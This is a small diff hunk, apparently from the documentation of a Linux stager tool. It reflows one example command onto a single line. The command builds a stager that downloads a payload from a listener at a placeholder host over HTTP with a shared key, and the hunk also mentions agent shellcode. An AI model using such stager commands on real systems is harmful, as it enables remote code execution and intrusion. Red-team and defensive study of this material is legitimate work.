@@ -27,9 +27,7 @@ stager_linux --format executable --agent-pic /path/to/agent.bin
 Download the payload from a listener:
 
 ```bash
-stager_linux --format executable --transport http \
-  --payload-host 203.0.113.10 --payload-port 8000 --payload-path / \
-  --payload-key 'shared-key'
+stager_linux --format executable --transport http --payload-host 203.0.113.10 --payload-port 8000 --payload-path / --payload-key 'shared-key'
 ```
 
 Build a shared object or packed shellcode:
